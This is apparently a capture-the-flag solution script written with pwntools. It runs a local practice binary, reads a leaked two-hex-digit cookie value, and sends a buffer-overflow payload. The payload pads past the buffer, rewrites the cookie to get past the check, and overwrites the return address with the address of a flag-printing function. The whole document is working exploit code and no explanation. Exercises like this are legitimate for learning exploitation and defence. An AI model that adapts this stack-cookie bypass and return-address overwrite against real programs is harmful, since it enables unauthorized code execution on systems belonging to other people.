from pwn import *

p = process("./Bufferoverflow-homemade-cookie-v2")

v2 = int(p.recv(2), 16)

cat_flag = 0x0804857b

payload = b'a'*16 + p32(v2) + b'a'*12 + p32(cat_flag)
p.sendline(payload)

p.interactive()